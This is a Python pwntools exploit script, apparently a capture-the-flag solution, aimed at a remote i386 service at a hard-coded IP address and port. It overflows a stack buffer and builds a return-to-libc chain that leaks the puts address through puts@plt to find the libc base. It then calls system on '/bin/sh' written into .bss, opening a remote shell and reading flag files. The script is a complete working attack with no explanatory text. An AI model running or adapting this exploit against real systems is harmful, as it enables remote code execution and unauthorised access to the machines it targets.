from pwn import *

context.arch = "i386"
context.log_level = "info"

HOST = "39.96.193.120"
PORT = 10002

OFFSET = 0x54

PUTS_PLT = 0x08049050
PUTS_GOT = 0x0804C010
VUL = 0x08049205

LIBC_PUTS = 0x6D1E0
LIBC_SYSTEM = 0x41360


def exploit():
    io = remote(HOST, PORT)

    io.recvline()
    payload1 = b"A" * OFFSET
    payload1 += p32(PUTS_PLT)
    payload1 += p32(VUL)
    payload1 += p32(PUTS_GOT)
    io.send(payload1)

    leak = u32(io.recv(4))
    libc_base = leak - LIBC_PUTS
    system_addr = libc_base + LIBC_SYSTEM

    log.success(f"puts  @ {leak:#x}")
    log.success(f"libc  @ {libc_base:#x}")
    log.success(f"system@ {system_addr:#x}")

    bss = 0x0804C040
    payload2 = b"B" * OFFSET
    payload2 += p32(0x08049040)  # read@plt
    payload2 += p32(system_addr)
    payload2 += p32(0)
    payload2 += p32(bss)
    payload2 += p32(8)
    io.send(payload2)

    sleep(0.2)
    io.send(b"/bin/sh\x00")
    sleep(0.3)

    io.sendline(b"id")
    io.sendline(b"cat /flag*")

    io.interactive()


if __name__ == "__main__":
    exploit()
